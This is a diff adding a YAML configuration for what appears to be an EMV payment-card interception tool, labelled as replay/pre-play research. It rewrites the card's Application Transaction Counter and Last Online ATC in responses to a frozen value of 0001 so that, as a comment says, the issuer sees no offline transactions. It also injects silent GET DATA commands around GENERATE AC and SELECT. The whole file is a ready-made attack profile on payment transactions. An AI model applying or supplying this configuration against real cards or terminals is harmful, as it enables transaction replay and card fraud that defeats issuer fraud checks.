@@ -1,0 +1,48 @@
+# COMBO-E — ATC freeze + silent injection (replay/pre-play research)
+# Freezes ATC and Last Online ATC at 0001, injects silent GET DATA commands
+enabled: true
+log_mutations: true
+log_path: "logs/mutations.jsonl"
+
+pdol_mutations: []
+
+afl_mutations: []
+
+dol_mutations: []
+
+response_mutations:
+  - tag:     "9F36"
+    mode:    replace
+    value:   "0001"
+    enabled: true
+    comment: "ATC: frozen at 0001 — replay / pre-play research"
+    on_ins:  ["CA"]
+
+  - tag:     "9F13"
+    mode:    replace
+    value:   "0001"
+    enabled: true
+    comment: "Last Online ATC: set equal to ATC — issuer sees no offline transactions"
+    on_ins:  ["CA"]
+
+injected_commands:
+  - trigger_ins: "AE"
+    when:        after_response
+    apdu:        "80CA9F3600"
+    repeat:      false
+    enabled:     true
+    comment:     "Silent ATC read after GenAC"
+
+  - trigger_ins: "AE"
+    when:        after_response
+    apdu:        "80CA9F1300"
+    repeat:      false
+    enabled:     true
+    comment:     "Silent Last Online ATC read after GenAC"
+
+  - trigger_ins: "A4"
+    when:        before_command
+    apdu:        "80CA9F4F00"
+    repeat:      false
+    enabled:     true
+    comment:     "Silent Log Format probe before SELECT"
